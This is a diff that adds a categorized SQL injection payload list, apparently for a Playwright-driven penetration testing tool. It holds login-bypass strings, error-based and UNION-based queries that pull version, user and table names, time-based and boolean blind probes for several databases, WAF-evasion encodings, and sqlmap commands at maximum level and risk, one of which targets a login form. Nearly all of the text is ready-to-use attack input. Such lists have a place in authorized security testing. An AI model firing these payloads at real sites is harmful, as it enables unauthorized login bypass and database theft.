@@ -1,0 +1,61 @@
+# SQL injection payloads by technique.
+# Prefer sqlmap for automated exploitation; these are for Playwright-driven manual probes and WAF-bypass triage.
+
+## AUTH_BYPASS
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+admin'--
+admin' #
+admin'/*
+') OR ('1'='1
+
+## ERROR_BASED_MYSQL
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+## TIME_BASED_BLIND
+' AND SLEEP(5)--            # MySQL
+' OR SLEEP(5)--             # MySQL
+'; WAITFOR DELAY '0:0:5'--  # MSSQL
+'; SELECT pg_sleep(5)--     # PostgreSQL
+' || DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- # Oracle
+
+## BOOLEAN_BLIND
+' AND '1'='1'--
+' AND '1'='2'--
+' AND 1=1--
+' AND 1=2--
+
+## UNION_BASED
+# Determine column count first
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT @@version--
+' UNION SELECT user()--
+' UNION SELECT database()--
+' UNION SELECT table_name FROM information_schema.tables--
+
+## WAF_BYPASS
+/**/UNION/**/SELECT          # Comment-stuffed
+UnIoN SeLeCt                 # Mixed case
+%55NION %53ELECT             # URL-encoded
+' || '1                      # Concat operator
+'+AND+'1                     # Plus-encoded spaces
+--tamper=space2comment       # sqlmap tamper hint
+--tamper=between,randomcase,space2comment
+
+## SQLMAP_INVOCATIONS
+# Standard GET
+sqlmap -u "https://target/page?id=1" --batch --dbs
+# POST with credentials harvested by Playwright
+sqlmap -u "https://target/login" --data="user=admin&pass=test" --batch
+# From a saved Burp/curl request
+sqlmap -r request.txt --batch --level=5 --risk=3
+# With tamper for WAF
+sqlmap -r request.txt --batch --tamper=space2comment,between
